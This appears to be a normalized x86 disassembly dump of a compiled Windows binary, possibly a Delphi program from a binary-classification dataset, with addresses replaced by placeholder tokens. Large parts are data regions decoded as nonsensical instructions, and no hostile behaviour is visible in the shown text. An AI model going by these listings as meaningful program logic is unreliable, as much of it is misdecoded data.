mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_3a772a4
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_3a66ccc
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_3a77324
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_3a66ccc
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_3a77398
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a773de
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a773e5
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
call sub_3a652a0
sub_3a7762c
add [ eax ] al
rol [ ebp - 0x5a ] 0x1
cmpsd [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0xc03a7 ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
ja r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] bh
outsb
inc ebp
jb r-xdata
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax * 2 + 0x65727453 ]
popad
insd
inc ebp
jb r-xdata
inc eax
add [ eax ] dh
ja r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
test [ esi - 0x59 ] dh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ 0x72434645 ]
popad
je r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add al dl
jbe r-xdata
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
cwde
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x78
outsd
jb r-xdata
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add ecx [ eax + eax ]
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ecx [ ebp + 0x76740040 ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ esi + 0x408d03 ] esp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jbe r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
push edx
popad
inc ebp
jb r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
outsd
jb r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx ]
inc ebp
inc esi
dec edi
jo r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x77
cmpsd [ esi ] [ edi ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
shl [ esi - 0x59 ] 0x1
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 - 0x59 ] dh
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
sub [ esi - 0x59 ] dh
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add ecx [ eax + eax ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx ]
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
sbb [ ebx - 0x5a ] al
xchg esp eax
js r-xdata
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
ja r-xdata
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ eax ]
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ edi + esi * 2 + 0x3a7 ] 0x0
add [ eax ] al
test [ esi - 0x59 ] dh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add ecx [ eax + eax ]
add [ eax ] al
sub [ esi - 0x59 ] dh
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
inc ebp
inc ebx
insb
popad
jae r-xdata
cmpsd [ esi ] [ edi ]
add [ eax ] al
cwde
ja r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0xc03a7 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
add [ eax ] al
cwde
ja r-xdata
add ecx [ eax + eax ]
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
add ecx [ eax + eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
outsd
jne r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jns r-xdata
outsd
jb r-xdata
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax * 2 + 0x4e736552 ]
outsd
je r-xdata
xor al 0x43
cld
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jns r-xdata
nop
dec eax
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
lea eax [ eax ]
movsb [ edi ] [ esi ]
jns r-xdata
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx ]
inc ebp
push edi
jb r-xdata
inc ebx
js r-xdata
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
jns r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] cl
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0xc03a7 ] ah
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 - 0x59 ] dl
add ecx [ eax + eax ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ eax ]
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edi ]
inc ebp
inc ebx
outsd
insd
jo r-xdata
add edx [ eax ]
add [ eax ] al
add al cl
test [ esi - 0x59ba37fd ] esp
add edx esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jpo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
push esp
jpe r-xdata
inc eax
add [ edx + edi * 2 + 0x3a7 ] dh
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
add [ eax ] al
enter 0xa685 0x3
enter 0xa645 0x3
aam 0x45
add ecx [ eax + eax ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
inc ebx
cmpsb [ esi ] [ edi ]
add ebp esp
aam 0xa6
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edi ]
inc ebp
dec edi
jne r-xdata
jb r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ ecx ]
inc ebp
dec ecx
outsb
jbe r-xdata
cmpsb [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] al
add al al
adc [ esi - 0x59ba37fd ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ ebx - 0x59 ]
jne r-xdata
add esi [ eax - 0x5d ]
cmpsd [ esi ] [ edi ]
add ebp eax
mov [ 0x540503a7 ] eax
dec esp
imul esi [ ebx + 0x74 ] 0x7c30c08b
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jl r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x7bccc08b
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jpo r-xdata
outsd
jb r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ ebx ]
cmpsd [ esi ] [ edi ]
add edi [ esp - 0x58c3fc59 ]
cmpsd [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
add esp [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ edi + 0x540b03a7 ]
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jpo r-xdata
arpl [ ebp + 0x73 ] sp
insb
jpo r-xdata
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx - 0x59 ] bh
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 - 0x59 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x7a
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add esi esi
jl r-xdata
add [ eax ] al
mov [ edi + 0x3 ] bh
or al 0x0
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
test eax 0x540503a7
inc edx
imul esi [ ebx + esi * 2 - 0x75 ] 0xa77cdcc0
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jge r-xdata
add eax [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x544bfc59 ]
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
add eax [ edx ]
add bh bh
sub_3a77d51
sub eax 0x3b03a77d
outsb
je r-xdata
add eax [ ebp + 0x7d ]
cmpsd [ esi ] [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
fdivr [ edi + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp - 0x59 ] bh
ror [ eax ] 0x7d
cmpsd [ esi ] [ edi ]
add eax [ edi ]
or edx [ eax + edx * 2 + 0x65 ]
jb r-xdata
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x7dcc0040 ] cl
add [ eax ] al
add [ eax ] al
add esi esi
jl r-xdata
cmpsd [ esi ] [ edi ]
add ebx [ ebp + 0x7d ]
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add ah bl
jge r-xdata
imul esi [ ebx + 0x74 ] 0xdc746e65
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
jae r-xdata
mov eax [ eax ]
jmp [ eax + 0xc ]
add ecx [ eax ]
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jl r-xdata
add [ eax ] al
mov [ edi + 0x3 ] bh
or al 0x0
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
test eax 0x540503a7
inc edx
imul esi [ ebx + esi * 2 - 0x75 ] 0xa77cdcc0
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jge r-xdata
add eax [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x544bfc59 ]
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
add eax [ edx ]
add bh bh
add edx [ ecx + edx ]
jmp sub_3a7ace4
add ecx [ eax + eax ]
add [ eax ] al
nop
jl r-xdata
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
clc
mov eax [ esp + 0x4 ]
or al 0x83
inc esp
and al 0x4
clc
jmp r-xdata
jge r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
jge r-xdata
add ecx eax
inc ebp
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jae r-xdata
jge r-xdata
add edi [ ebx ]
nop
jl r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ecx
jge r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
imul esi [ ebx + 0x74 ] 0x8746e65
